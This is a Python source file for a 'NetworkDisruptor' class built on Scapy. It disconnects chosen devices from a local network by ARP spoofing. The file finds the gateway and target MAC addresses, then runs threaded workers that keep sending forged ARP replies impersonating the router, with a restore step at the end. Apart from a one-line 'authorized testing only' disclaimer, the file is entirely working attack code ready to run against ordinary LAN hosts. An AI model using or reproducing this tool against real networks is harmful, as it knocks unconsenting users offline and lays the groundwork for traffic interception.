"""
LEGAL DISCLAIMER:
This tool is for authorized security testing ONLY.
Unauthorized use may violate laws. Use at your own risk.
"""

import time
import threading
import logging
import re
import subprocess
import ipaddress
from scapy.all import ARP, Ether, send, srp, conf, get_if_list
import netifaces

# Configure logging
logger = logging.getLogger("network_disruptor")
logger.setLevel(logging.INFO)
if not logger.handlers:
    import os
    os.makedirs("instance", exist_ok=True)
    fh = logging.FileHandler("instance/network_disruptor.log")
    fh.setFormatter(logging.Formatter(
        "%(asctime)s [%(levelname)s] %(name)s — %(message)s"
    ))
    logger.addHandler(fh)

conf.verb = 0

class NetworkDisruptor:
    """Tool to disconnect devices from network using ARP spoofing"""
    
    def __init__(self):
        self.active_attacks = {}
        self.attack_lock = threading.Lock()
        self.gateway_ip = None
        self.gateway_mac = None
    
    def get_gateway_info(self):
        """Get router IP and MAC address"""
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET]
            self.gateway_ip = default_gateway[0]
            self.gateway_mac = self._get_mac(self.gateway_ip)
            
            if self.gateway_mac:
                return True, f"Gateway: {self.gateway_ip}"
            else:
                return False, "Failed to get Gateway MAC"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def _get_mac_from_arp_cache(self, ip):
        """Check the OS ARP cache for a MAC address (fast, no packet needed)"""
        try:
            output = subprocess.check_output(
                ["arp", "-a", ip], stderr=subprocess.DEVNULL, timeout=3
            ).decode(errors="ignore")
            # Windows arp -a output: "  192.168.1.1     aa-bb-cc-dd-ee-ff     dynamic"
            match = re.search(
                r"([0-9a-f]{2}[:\-][0-9a-f]{2}[:\-][0-9a-f]{2}[:\-]"
                r"[0-9a-f]{2}[:\-][0-9a-f]{2}[:\-][0-9a-f]{2})",
                output, re.IGNORECASE
            )
            if match:
                mac = match.group(1).replace("-", ":")
                logger.info(f"ARP cache hit for {ip}: {mac}")
                return mac
        except Exception as e:
            logger.debug(f"ARP cache lookup failed for {ip}: {e}")
        return None

    def _find_interface_for_ip(self, ip):
        """
        Find the correct local network interface to reach 'ip' by matching
        the IP against each interface's subnet. Falls back to conf.route.route().
        This avoids Scapy picking a VPN/Hyper-V virtual adapter by mistake.
        """
        try:
            target = ipaddress.ip_address(ip)
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET not in addrs:
                    continue
                for addr_info in addrs[netifaces.AF_INET]:
                    local_ip = addr_info.get("addr", "")
                    netmask = addr_info.get("netmask", "")
                    if not local_ip or not netmask:
                        continue
                    try:
                        network = ipaddress.ip_network(
                            f"{local_ip}/{netmask}", strict=False
                        )
                        if target in network:
                            logger.info(
                                f"Subnet match: {ip} is on {network} via {iface}"
                            )
                            return iface
                    except ValueError:
                        continue
        except Exception as e:
            logger.warning(f"Interface detection error for {ip}: {e}")

        # Fallback: trust Scapy's routing table
        try:
            iface, _, _ = conf.route.route(ip)
            logger.info(f"Routing table fallback: {ip} -> {iface}")
            return iface
        except Exception as e:
            logger.error(f"conf.route.route failed for {ip}: {e}")
            return conf.iface

    def _get_mac(self, ip, timeout=3, retries=3):
        """Get MAC address for given IP — checks OS cache first, then live ARP probe"""
        # Step 1: Try the OS ARP cache (instant, no packet needed, always uses right iface)
        cached_mac = self._get_mac_from_arp_cache(ip)
        if cached_mac:
            return cached_mac

        # Step 2: Trigger a ping to populate the ARP cache, then try cache again
        try:
            subprocess.call(
                ["ping", "-n", "1", "-w", "500", ip],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2
            )
            cached_mac = self._get_mac_from_arp_cache(ip)
            if cached_mac:
                return cached_mac
        except Exception:
            pass

        # Step 3: Live ARP probe via Scapy, using subnet-matched interface
        correct_interface = self._find_interface_for_ip(ip)
        logger.info(f"Live ARP probe for {ip} on interface '{correct_interface}'")

        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request

        for attempt in range(1, retries + 1):
            try:
                answered, _ = srp(
                    packet,
                    timeout=timeout,
                    verbose=False,
                    iface=correct_interface
                )
                if answered:
                    return answered[0][1].hwsrc
                logger.warning(
                    f"ARP probe attempt {attempt}/{retries} got no reply from {ip}"
                )
            except Exception as e:
                logger.error(f"ARP probe error on attempt {attempt} for {ip}: {e}")

        logger.error(
            f"Could not resolve MAC for {ip} after {retries} attempts. "
            f"Interface used: '{correct_interface}'. "
            "Ensure the target is reachable and on the same subnet."
        )
        return None
    
    def _spoof(self, target_ip, target_mac, spoof_ip):
        """Send fake ARP packet with subnet-matched interface"""
        try:
            correct_interface = self._find_interface_for_ip(target_ip)
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            send(packet, verbose=False, iface=correct_interface)
        except Exception as e:
            logger.error(f"Spoofing error for {target_ip}: {e}")
    
    def _restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Restore normal connection with subnet-matched interface"""
        try:
            correct_interface = self._find_interface_for_ip(target_ip)
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                         psrc=gateway_ip, hwsrc=gateway_mac)
            send(packet, count=5, verbose=False, iface=correct_interface)
        except Exception as e:
            logger.error(f"Restore error for {target_ip}: {e}")
    
    def kick_device(self, target_ip, duration=None):
        """
        Disconnect device from network
        
        Args:
            target_ip: Target device IP
            duration: Duration in seconds (None = permanent)
        
        Returns:
            (success, message)
        """
        if not self.gateway_ip or not self.gateway_mac:
            success, msg = self.get_gateway_info()
            if not success:
                return False, msg
        
        target_mac = self._get_mac(target_ip)
        if not target_mac:
            return False, f"Device not found at {target_ip}"
        
        with self.attack_lock:
            if target_ip in self.active_attacks:
                return False, f"Attack already active on {target_ip}"
        
        attack_thread = threading.Thread(
            target=self._attack_worker,
            args=(target_ip, target_mac, duration),
            daemon=True
        )
        
        with self.attack_lock:
            self.active_attacks[target_ip] = attack_thread
        
        attack_thread.start()
        
        duration_msg = f"for {duration}s" if duration else "indefinitely"
        logger.critical(f"ATTACK: Device {target_ip} disconnected {duration_msg}")
        return True, f"Disconnecting {target_ip} {duration_msg}"
    
    def _attack_worker(self, target_ip, target_mac, duration):
        """Continuous attack worker"""
        start_time = time.time()
        
        try:
            logger.info(f"Starting ARP spoofing attack on {target_ip} ({target_mac})")
            
            while True:
                self._spoof(target_ip, target_mac, self.gateway_ip)
                time.sleep(2)
                
                if duration and (time.time() - start_time) > duration:
                    logger.info(f"Attack duration expired for {target_ip}")
                    break
                
                with self.attack_lock:
                    if target_ip not in self.active_attacks:
                        logger.info(f"Attack manually stopped for {target_ip}")
                        break
        finally:
            logger.info(f"Restoring normal ARP table for {target_ip}")
            self._restore(target_ip, target_mac, self.gateway_ip, self.gateway_mac)
            
            with self.attack_lock:
                if target_ip in self.active_attacks:
                    del self.active_attacks[target_ip]
    
    def stop_attack(self, target_ip):
        """Stop attack on specific device"""
        with self.attack_lock:
            if target_ip in self.active_attacks:
                del self.active_attacks[target_ip]
                return True, f"Stopped attack on {target_ip}"
            return False, f"No active attack on {target_ip}"
    
    def stop_all_attacks(self):
        """Stop all attacks"""
        with self.attack_lock:
            count = len(self.active_attacks)
            self.active_attacks.clear()
        return count, f"Stopped {count} attacks"
    
    def get_active_attacks(self):
        """Get list of active attacks"""
        with self.attack_lock:
            return list(self.active_attacks.keys())